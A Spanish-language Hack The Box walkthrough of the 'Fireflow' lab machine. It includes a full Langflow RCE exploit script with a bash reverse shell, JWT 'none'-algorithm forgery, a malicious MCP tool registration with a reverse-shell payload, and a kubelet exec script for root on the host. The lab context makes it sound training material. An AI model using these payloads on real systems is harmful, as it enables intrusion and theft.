---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Fireflow HackTheBox (Intermediate)

# Contexto de la maquina
## Trayectoria Fireflow

<figure><img src="../../.gitbook/assets/trayectoria_17f1d612ac.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Fireflow** es una máquina Linux de dificultad **Intermediate** que combina la explotación de una plataforma de automatización de flujos de IA (**Langflow**) con una cadena de escalada de privilegios que transita por cuatro usuarios distintos y termina con una técnica de escape hacia el host mediante el kubelet de Kubernetes.

La cadena de compromiso comienza con el acceso a una instancia de **Langflow** expuesta públicamente, donde un flujo (`flow`) accesible sin autenticación tiene un `flow_id` visible en la URL de la página principal. Ese ID se usa para explotar el **CVE-2026-33017**, un RCE preautenticado que permite inyectar código Python arbitrario en un componente del flujo. Una vez dentro como `www-data`, se extraen credenciales en texto plano de las variables de entorno del proceso para pivotar al usuario `nightfall`. Desde ahí, un archivo de configuración del directorio `.mcp` revela credenciales de un servicio de registro de herramientas MCP que escucha internamente, y cuyo JWT es vulnerable al algoritmo `none`, permitiendo forjar un token de administrador y registrar una herramienta maliciosa que ejecuta comandos como el usuario `mcp`. Finalmente, el service account de Kubernetes asociado al pod tiene permiso `get nodes/proxy`, lo que permite acceder directamente al kubelet y ejecutar comandos en un pod privilegiado (`node-exporter`) que corre como `root` y monta el sistema de archivos del host completo.

**Objetivo**

- Explotar CVE-2026-33017 en Langflow para obtener RCE como `www-data`.
- Extraer credenciales de las variables de entorno del proceso para pivotar a `nightfall`.
- Explotar la forja de JWT con algoritmo `none` para obtener rol de admin en el servicio MCP interno.
- Registrar una herramienta maliciosa y obtener shell como `mcp`.
- Abusar del permiso `get nodes/proxy` del service account para ejecutar comandos como `root` en el host vía kubelet.

**Tipo de máquina**

- Plataforma: Hack The Box
- Sistema operativo: Linux / Kubernetes
- Categoría principal: Web / Cloud
- Componentes involucrados:
    - Langflow con RCE preautenticado (CVE-2026-33017).
    - Credenciales en variables de entorno del proceso.
    - Servicio MCP interno con JWT vulnerable a algoritmo `none`.
    - Registro de herramienta maliciosa en MCP como admin.
    - Kubernetes con `get nodes/proxy` para acceso al kubelet.
    - Pod `node-exporter` privilegiado con montaje del host.

**Habilidades y técnicas evaluadas**

- Fuzzing de subdominios con FFUF.
- Identificación y explotación de Langflow RCE preautenticado.
- Adaptación de exploits públicos para entornos HTTPS.
- Tratamiento y estabilización de TTY.
- Extracción de credenciales desde variables de entorno.
- Reutilización de credenciales entre servicios.
- Decodificación y forja de tokens JWT.
- Bypass de autenticación con algoritmo `none` en JWT.
- Registro de herramientas maliciosas en API MCP.
- Enumeración de permisos de service account Kubernetes.
- Abuso de `nodes/proxy` para acceso al kubelet (puerto 10250).
- Ejecución de comandos en pod privilegiado via kubelet API.
- Lectura de archivos del host mediante montaje `/host`.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_RCE_preautenticado_en_Langflow_1784108605326.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Credenciales_de_administrador__1784108605955.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Algoritmo__none__aceptado_en_v_1784108606483.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Registro_de_herramienta_MCP_ma_1784108607032.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Abuso_de__get_nodes_proxy__par_1784108607632.png" alt=""><figcaption></figcaption></figure>

# Escaneo de puertos

Comenzamos realizando un escaneo completo de todos los puertos TCP para identificar los servicios expuestos en la máquina objetivo. El flag `--open` nos filtra solo los puertos abiertos, `-sS` realiza un escaneo SYN (sigiloso), y `--min-rate 5000` acelera el proceso enviando al menos 5000 paquetes por segundo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un segundo escaneo más detallado sobre ellos para obtener las versiones exactas de los servicios y ejecutar los scripts de detección por defecto de Nmap (`-sCV`).

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 11:54 +0000
Nmap scan report for 10.129.70.66
Host is up (0.031s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
443/tcp open  ssl/http nginx
| ssl-cert: Subject: commonName=fireflow.htb
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
|_http-title: Did not follow redirect to https://fireflow.htb/

Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds
```

Solo dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 9.6p1), de momento no explotable directamente.
- **Puerto 443** → HTTPS (nginx). El certificado SSL es para `fireflow.htb` e incluye un wildcard `*.fireflow.htb`, lo que confirma que habrá subdominios. Además, la redirección apunta al dominio `fireflow.htb`.
## Añadir dominio al /etc/hosts

```bash
nano /etc/hosts

# Dentro del nano añadimos la siguiente línea:
<IP>           fireflow.htb
```
## Enumeración web

Accedemos al dominio:

```
URL = https://fireflow.htb
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260715091830.png" alt=""><figcaption></figcaption></figure>

Página corporativa normal. Realizamos fuzzing de subdominios para descubrir servicios adicionales.
# FFUF
## Fuzzing de subdominios (VHost)

```bash
ffuf -c -w subdomains-top1million-110000.txt -u "https://fireflow.htb" -H "Host: FUZZ.fireflow.htb" -t 100 -fw 5
```

Resultado:

```
flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 49ms]
```

Encontramos el subdominio `flow`. Lo añadimos al archivo de hosts:

```bash
nano /etc/hosts

# Dentro del nano dejamos la línea así:
<IP>           fireflow.htb flow.fireflow.htb
```
## Acceso al subdominio flow

Accedemos al subdominio:

```
URL = https://flow.fireflow.htb
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260715092518.png" alt=""><figcaption></figcaption></figure>

Encontramos el panel de **Langflow**, una plataforma open source para construir flujos de trabajo con modelos de IA (LLMs). El registro está habilitado pero los nuevos usuarios requieren aprobación del administrador antes de poder acceder.

Sin embargo, en la página principal hay un botón `Open Agent` que nos redirige a:

```
URL = https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

<figure><img src="../../.gitbook/assets/Pasted image 20260715093309.png" alt=""><figcaption></figcaption></figure>

La URL contiene un `flow_id`: `7d84d636-af65-42e4-ac38-26e867052c25`. Este es el identificador del flujo público de Langflow que está accesible sin autenticación. Esto es exactamente lo que necesitamos para explotar el CVE-2026-33017.
# Escalate user www-data

<figure><img src="../../.gitbook/assets/vuln_RCE_preautenticado_en_Langflow_64ef88dc.png" alt=""><figcaption></figcaption></figure>

## CVE-2026-33017 — RCE preautenticado en Langflow

El **CVE-2026-33017** afecta al endpoint `/api/v1/build_public_tmp/{flow_id}/flow` de Langflow, que permite reconstruir un flujo público sin requerir autenticación. El ataque consiste en enviar un payload que incluye un componente de tipo `CustomComponent` cuyo campo `code` contiene código Python arbitrario. Cuando Langflow procesa el flujo, ejecuta ese código en el servidor con los privilegios del proceso (`www-data`).

El PoC de referencia está disponible en:

URL = [Exploit GitHub CVE-2026-33017](https://github.com/EQSTLab/CVE-2026-33017)
## Adaptación del exploit para HTTPS

El exploit público funciona únicamente sobre HTTP. Dado que el servidor usa HTTPS con certificado autofirmado, necesitamos hacer tres cambios al `exploit.py` original:

1. Importar `urllib3` y deshabilitar los warnings de SSL.
2. Añadir `verify=False` en la petición `requests.post()`.
3. Asegurarse de que la URL usa `https://` en lugar de `http://`.

A continuación el exploit ya modificado con los cambios comentados:

> exploit.py

```python
import argparse
import sys
import threading
import uuid
import socket
import time
import base64
import requests
import urllib3  # AÑADIDO: para suprimir warnings SSL

# AÑADIDO: suprimir warnings de certificado autofirmado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def start_listener(lport):
    print(f"[*] Listening on 0.0.0.0:{lport}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', lport))
            s.listen(1)
            conn, addr = s.accept()
            print(f"\n[!] SHELL ESTABLISHED FROM {addr[0]}:{addr[1]}\n")

            def pipe_data(src, dst):
                while True:
                    try:
                        d = src.recv(4096)
                        if not d: break
                        dst.write(d.decode(errors='replace'))
                        dst.flush()
                    except: break

            threading.Thread(target=pipe_data, args=(conn, sys.stdout), daemon=True).start()
            try:
                while True:
                    cmd = sys.stdin.readline()
                    if not cmd: break
                    conn.sendall(cmd.encode())
            except KeyboardInterrupt: pass
    except Exception as e: print(f"[-] Listener Error: {e}")

def build_exploit_payload(command: str) -> dict:
    malicious_code = f"""\
from langflow.custom import Component
from langflow.io import Output
_r = __import__('os').system({repr(command)})
class ExploitComponent(Component):
    display_name = "ExploitComponent"
    outputs = [Output(display_name="Result", name="output", method="run")]
    def run(self) -> str: return "ok"
"""
    node_id = str(uuid.uuid4())
    return {
        "data": {
            "nodes": [
                {
                    "id": node_id,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": malicious_code,
                                    "type": "code",
                                    "required": True,
                                    "show": True,
                                    "name": "code",
                                    "dynamic": False,
                                    "list": False,
                                    "multiline": True,
                                },
                            },
                            "description": "poc",
                            "display_name": "ExploitComponent",
                            "custom_fields": {},
                            "output_types": ["str"],
                            "base_classes": ["str"],
                            "outputs": [{"display_name": "Result", "name": "output", "method": "run", "selected": "str", "types": ["str"], "value": "__UNDEFINED__"}],
                        },
                    },
                }
            ],
            "edges": [],
            "viewport": {"x": 0, "y": 0, "zoom": 1},
        }
    }

def send_exploit(base_url, flow_id, command, timeout):
    payload = build_exploit_payload(command)
    endpoint = f"{base_url}/api/v1/build_public_tmp/{flow_id}/flow"

    try:
        print(f"[*] Enviando payload a: {endpoint}")
        resp = requests.post(
            endpoint,
            json=payload,
            cookies={"client_id": str(uuid.uuid4())},
            timeout=timeout,
            verify=False  # CAMBIO CLAVE: permite HTTPS con certificado autofirmado
        )
        print(f"[*] Respuesta: {resp.status_code} - {resp.text[:200]}")
        return resp.status_code in (200, 201)
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--flow-id", required=True)
    parser.add_argument("--lhost", default=get_local_ip())
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    threading.Thread(target=start_listener, args=(args.lport,), daemon=True).start()
    time.sleep(1)

    shell_cmd = f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"
    cmd = f"echo {base64.b64encode(shell_cmd.encode()).decode()} | base64 -d | bash"

    base_url = args.url.rstrip("/")

    # AÑADIDO: forzar HTTPS si la URL llega sin él
    if not base_url.startswith("https://"):
        base_url = base_url.replace("http://", "https://")
        print(f"[*] URL ajustada a: {base_url}")

    if send_exploit(base_url, args.flow_id, cmd, args.timeout):
        print("[+] Exploit enviado exitosamente.")
    else:
        print("[-] Falló el envío del exploit.")

    while True: time.sleep(1)

if __name__ == "__main__":
    main()
```
## Obtención de la reverse shell

Ejecutamos el exploit con el `flow_id` extraído de la URL:

```bash
python3 exploit.py --url https://flow.fireflow.htb/ --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost <IP_ATTACKER> --lport <PORT_ATTACKER>
```

Resultado:

```
[*] Listening on 0.0.0.0:7777...
[*] Enviando payload a: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow

[!] SHELL ESTABLISHED FROM 10.129.70.66:60690

www-data@fireflow:/var/lib/langflow$ whoami
www-data
```

Tenemos shell como `www-data`. Sanitizamos la TTY.
## Sanitizacion shell (TTY)

La shell obtenida a través de una reverse shell suele ser muy limitada: no tiene autocompletado, no permite usar atajos de teclado como `Ctrl+C` sin matar la sesión, y en general es bastante incómoda. Por eso realizamos el siguiente proceso para convertirla en una TTY completamente interactiva:

```shell
script /dev/null -c bash
```

```shell
# Suspendemos el proceso con Ctrl+Z
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Consultamos las dimensiones de nuestra terminal local
stty size

# Ajustamos las dimensiones de la shell remota para que coincidan
stty rows <ROWS> columns <COLUMNS>
```
# Escalate user nightfall

<figure><img src="../../.gitbook/assets/vuln_Credenciales_de_administrador__ca50cda9.png" alt=""><figcaption></figcaption></figure>

## Extracción de credenciales desde las variables de entorno

Las variables de entorno de un proceso contienen la configuración con la que fue lanzado por systemd o el orquestador del servicio. En el caso de Langflow, la configuración sensible se pasa como variables de entorno al proceso en lugar de almacenarse en archivos, lo que puede parecer más seguro pero expone las credenciales a cualquier proceso corriendo en el mismo contexto de usuario:

```bash
env
```

Info (extracto relevante):

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_NEW_USER_IS_ACTIVE=False
```

La variable `LANGFLOW_SUPERUSER_PASSWORD` contiene la contraseña del superusuario de Langflow: `n1ghtm4r3_b4_n1ghtf4ll`. Dado que el usuario del sistema se llama `nightfall` y es habitual la reutilización de contraseñas, probamos directamente:

```bash
su nightfall
# Contraseña: n1ghtm4r3_b4_n1ghtf4ll
```

Resultado:

```
nightfall@fireflow:/var/lib/langflow$ whoami
nightfall
```

Funciona. Leemos la flag del usuario:

> user.txt

```
af119d998eb1e8379721428a285bdb97
```
# Escalate user mcp

<figure><img src="../../.gitbook/assets/vuln_Algoritmo_(none)_aceptado_en_v_a6a878e1.png" alt=""><figcaption></figcaption></figure>

## Descubrimiento del servicio MCP interno

En el home de `nightfall` hay un directorio oculto `.mcp` con un archivo de configuración:

```bash
cat /home/nightfall/.mcp/config.json
```

Resultado:

```json
{
  "server": "http://10.129.70.66:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Hay un servicio MCP (**Model Context Protocol**, un protocolo estándar para exponer herramientas a agentes de IA) en el puerto `30080`. La configuración incluye credenciales. Consultamos los endpoints disponibles:

```bash
curl http://10.129.70.66:30080/api/v1/version
```

Resultado:

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

Dos detalles críticos en esta respuesta: el endpoint `POST /api/v1/tools` es solo para admins, y los algoritmos soportados son `HS256` y **`none`**. El algoritmo `none` en JWT es una vulnerabilidad conocida: permite construir tokens sin firma que algunos servidores aceptan como válidos si no validan correctamente el campo `alg`.
## Obtención del token JWT legítimo

Nos autenticamos con las credenciales del config:

```bash
curl -X POST http://10.129.70.66:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

Resultado:

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

Decodificamos el payload (la segunda sección del JWT, separada por puntos):

```bash
echo "eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9" | base64 -d 2>/dev/null
```

Resultado:

```json
{"sub":"langflow-bot","role":"user"}
```

El rol actual es `user`. Necesitamos cambiarlo a `admin`.
## Forja del JWT con algoritmo none

Un JWT tiene tres partes separadas por puntos: `header.payload.signature`. El algoritmo `none` indica al servidor que no hay firma que verificar. Si el servidor acepta este algoritmo, podemos construir un token con cualquier payload sin necesidad de conocer la clave secreta.

El proceso es:

1. Construir el header con `{"alg":"none","typ":"JWT"}` en Base64 URL-safe sin padding.
2. Construir el payload con `{"sub":"langflow-bot","role":"admin"}` en Base64 URL-safe sin padding.
3. Unirlos con un punto y añadir otro punto al final (la firma vacía).

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"langflow-bot","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."

echo "Token admin: $TOKEN"
```
## Verificación del acceso como admin

Probamos el token forjado contra el endpoint de herramientas:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://10.129.70.66:30080/api/v1/tools | python3 -m json.tool
```

Resultado:

```json
[
    {"name": "ping_host", "description": "Ping a target host 3 times and return ICMP output."},
    {"name": "get_metrics_summary", "description": "Return a summary of system memory and load average from /proc."},
    {"name": "list_running_tasks", "description": "List the top 20 running processes sorted by CPU usage."}
]
```

El servidor acepta el token forjado y nos devuelve la lista de herramientas. Somos admin.
## Registro de herramienta maliciosa

El endpoint `POST /api/v1/tools` (solo accesible como admin) permite registrar herramientas con código Python arbitrario en el campo `code`. Ese código se ejecuta en el servidor cuando la herramienta es invocada. Registramos una herramienta `shell` que ejecuta el comando pasado como parámetro `cmd`:

```bash
curl -s -X POST http://10.129.70.66:30080/api/v1/tools \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "name": "shell",
    "description": "Execute shell commands",
    "inputSchema": {
      "type":"object",
      "properties":{
        "cmd":{"type":"string","description":"Command to execute"}
      },
      "required":["cmd"]
    },
    "code": "import sys, json, subprocess\nparams = json.loads(sys.stdin.read())\ncmd = params.get(\"cmd\", \"id\")\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)\nprint(result.stdout)\nif result.stderr:\n    print(result.stderr)"
  }'
```

Resultado:

```json
{"status":"registered","name":"shell"}
```
## Verificación del RCE

<figure><img src="../../.gitbook/assets/vuln_Registro_de_herramienta_MCP_ma_0ecea2f8.png" alt=""><figcaption></figcaption></figure>

Invocamos la herramienta con `id` para confirmar bajo qué usuario se ejecuta:

```bash
curl -s -X POST http://10.129.70.66:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{"name":"shell","arguments":{"cmd":"id"}},
    "id":100
  }' | python3 -m json.tool
```

Resultado:

```json
{
    "result": {
        "content": [{"type": "text", "text": "uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)\n\n"}],
        "isError": false
    }
}
```

Los comandos se ejecutan como `mcp`. Lanzamos la reverse shell:

```bash
nc -lvnp <PORT>
```

```bash
curl -s -X POST http://10.129.70.66:30080/mcp \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{"name":"shell","arguments":{"cmd":"bash -c \"bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT_ATTACKER> 0>&1\""}},
    "id":120
  }'
```

Resultado:

```
listening on [any] 9001 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.70.66] 59693
mcp@mcp-server-54464cb475-29ztf:/app$ whoami
mcp
```

Somos `mcp` dentro de un pod de Kubernetes.
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_Abuso_de_(get_nodes_proxy)_par_9f9e46c1.png" alt=""><figcaption></figcaption></figure>

## Enumeración del service account de Kubernetes

Al estar dentro de un pod de Kubernetes, el directorio `/var/run/secrets/kubernetes.io/serviceaccount/` contiene el token de autenticación del service account asociado al pod, junto con el certificado del cluster y el namespace:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"
```
## Enumeración de permisos del service account

Consultamos qué operaciones tiene permitidas el service account `mcp-sa` en el namespace `default`:

```bash
curl -k -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -m json.tool
```

Del output extraemos el permiso crítico:

```json
{
    "verbs": ["get"],
    "apiGroups": [""],
    "resources": ["nodes/proxy"]
}
```

El permiso **`get nodes/proxy`** es sumamente peligroso: permite acceder directamente a la API del **kubelet** (el agente de Kubernetes que corre en cada nodo físico) usando el API Server como proxy. El kubelet, a diferencia del API Server, no aplica las políticas RBAC de la misma forma, y expone el endpoint `/exec/{namespace}/{pod}/{container}` que permite ejecutar comandos en cualquier contenedor del nodo.
## Identificación del pod privilegiado

Listamos los pods del nodo a través de la API del kubelet. Del output del JSON obtenemos que el pod `prometheus-prometheus-node-exporter-nmntq` en el namespace `monitoring` tiene la siguiente configuración de seguridad:

```yaml
securityContext:
  privileged: true       # acceso total al kernel del host
  runAsUser: 0           # ejecuta como root
hostPID: true            # puede ver todos los procesos del host
volumes:
  - hostPath:
      path: "/"          # monta el sistema de archivos completo del host
    mountPath: /host
```

Este pod es el vector perfecto: corre como `root`, tiene acceso al kernel y el sistema de archivos completo del host está disponible en `/host`.
## Ejecución de comandos en el pod privilegiado vía kubelet

El kubelet expone el endpoint `/exec/{namespace}/{pod}/{container}` en el puerto `10250`. Los parámetros `command` se pasan como query string con la sintaxis `command=parte1&command=parte2` (una por cada token del comando). Creamos un script que automatiza la ejecución:

```bash
cat > /tmp/rce_kube.py << 'EOF'
import subprocess, sys

NODE = "10.129.70.66"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

# El kubelet requiere que cada token del comando sea un parámetro 'command' separado
cmd_parts = COMMAND.split()
args = "&".join(f"command={part}" for part in cmd_parts)
url = f"https://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&error=1&{args}"

result = subprocess.run([
    "curl", "-k", "-s",
    "-H", f"Authorization: Bearer {TOKEN}",
    "-H", "Connection: Upgrade",
    "-H", "Upgrade: websocket",
    url
], capture_output=True, text=True)
print(result.stdout)
print(result.stderr)
EOF
```
## Verificación del RCE como root en el host

```bash
python3 /tmp/rce_kube.py "id"
```

Resultado:

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
```

Ejecutamos comandos como `root` en el pod `node-exporter`. Dado que el sistema de archivos del host está montado en `/host`, podemos leer cualquier archivo del host directamente:

```bash
python3 /tmp/rce_kube.py "cat /host/root/root/root.txt"
```

> root.txt

```
d37676cb121597d1bc25991e55f9abf5
```

